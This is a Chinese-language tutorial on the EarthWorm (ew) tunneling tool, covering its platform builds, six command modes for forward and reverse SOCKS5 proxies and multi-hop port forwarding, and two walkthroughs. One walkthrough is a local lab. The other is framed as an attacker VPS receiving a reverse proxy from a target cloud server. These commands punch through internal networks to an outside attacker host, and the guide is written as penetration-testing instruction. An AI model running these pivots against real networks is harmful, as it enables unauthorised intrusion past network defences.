1.可穿透复杂的内网环境。（这么说吧：我本地连着路由器开一个虚拟机，可以直接反弹到公网的云服务器上。）
2.以支持多平台间的转接通讯，Linux、Windows、MacOS、Arm-Linux均支持。

支持平台列表：（可跨平台反弹）

ew_for_Win.exe        适用各种Windows系统(X86指令集、X64指令集)        Windows7、Windows XP
ew_for_Linux32        各常见Linux发行版 (X86 指令集 CPU)        Ubuntu(X86)/BT5(X86)
ew_for_linux64        各常见Linux发行版 (X64 指令集 CPU)        Ubuntu(X64)/Kali(X64)
ew_for_MacOSX64        MacOS系统发行版 (X64 指令集)        苹果PC电脑，苹果server
ew_for_Arm32        常见Arm-Linux系统        HTC New One(Arm-Android)/小米路由器(R1D)
ew_mipsel        常见Mips-Linux系统 (Mipsel指令集 CPU)        萤石硬盘录像机、小米mini路由器(R1CM)
 

0x01 使用方法

以下所有样例，如无特殊说明代理端口均为1080，服务均为SOCKSv5代理服务.
该工具共有 6 种命令格式（ssocksd、rcsocks、rssocks、lcx_slave、lcx_listen、lcx_tran）。
1.正向SOCKS v5服务器

$ ./ew -s ssocksd -l 1080
2. 反弹 SOCKS v5 服务器
  这个操作具体分两步：
  a) 先在一台具有公网 ip 的主机A上运行以下命令：

$ ./ew -s rcsocks -l 1080 -e 8888 
b) 在目标主机B上启动 SOCKS v5 服务 并反弹到公网主机的 8888端口

$ ./ew -s rssocks -d 1.1.1.1 -e 8888 
成功。
3. 多级级联
工具中自带的三条端口转发指令，它们的参数格式分别为：

$ ./ew -s lcx_listen -l  1080   -e 8888
$ ./ew -s lcx_tran   -l  1080   -f 2.2.2.3 -g 9999
$ ./ew -s lcx_slave  -d 1.1.1.1 -e 8888    -f 2.2.2.3  -g  9999
通过这些端口转发指令可以将处于网络深层的基于TCP的服务转发至根前,比如 SOCKS v5。
首先提供两个“二级级联”本地SOCKS测试样例：
  a) lcx_tran 的用法

$ ./ew -s ssocksd  -l 9999
 
$ ./ew -s lcx_tran -l 1080 -f 127.0.0.1 -g 9999
b) lcx_listen、lcx_slave 的用法

$ ./ew -s lcx_listen -l 1080 -e 8888
 
$ ./ew -s ssocksd    -l 9999
 
$ ./ew -s lcx_slave  -d 127.0.0.1 -e 8888 -f 127.0.0.1 -g 9999
 

再提供一个“三级级联”的本地SOCKS测试用例以供参考

$ ./ew -s rcsocks -l 1080 -e 8888
 
$ ./ew -s lcx_slave -d 127.0.0.1 -e 8888 -f 127.0.0.1 -g 9999
 
$ ./ew -s lcx_listen -l 9999 -e 7777
 
$ ./ew -s rssocks -d 127.0.0.1 -e 7777
数据流向: SOCKS v5 -> 1080 -> 8888 -> 9999 -> 7777 -> rssocks

 

0x02 实战测试（分为本地测试和公网IP测试）

一般最常用的就是上面的第二条：反弹 SOCKS v5 服务器。
使用实例1：
目标机器：

ew.exe -s rssocks -d 2.2.2.2 -e 888
（2.2.2.2为想要反弹到的机器）
攻击机器：

ew.exe -s rcsocks -l 1008 -e 888
（监听888端口，转发到1008端口）
测试环境：
在这里我直接用我的本机Win10作为目标机器，将虚拟机Win7作为攻击机器。

 

本机Win10 ip：192.168.62.1
Win7 ip：192.168.62.128



 

ew_for_Win.exe -s rcsocks -l 1008 -e 888
接收888端口的数据并转发到1008端口。



此时正在监听。

目标机器Win10运行命令：

ew_for_Win.exe -s rssocks -d 192.168.62.128 -e 888


此时攻击机器会弹出连接成功的提示：
 

好了，到此Win10的SOCKS5代理就反弹到Win7攻击机上了。
只需要一个Socks5连接工具就可以连接到本地1008端口来代理访问了。
推荐工具SocksCap64。

 



 

在代理处配置127.0.0.1:1008
代理已连接。
使用实例2：
攻击者洛杉矶 Linux VPS ：45.78.*.*
目标阿里云服务器 Win2008：47.93.*.*

攻击者Linux监听：

[root@centos6 ~]# ./ew_for_Linux32 -s rcsocks -l 1008 -e 888


目标阿里云服务器反弹：

ew_for_Win.exe -s rssocks -d 45.78.*.* -e 888


攻击机器监听出现：rssocks cmd_socket OK!
表示反弹成功。
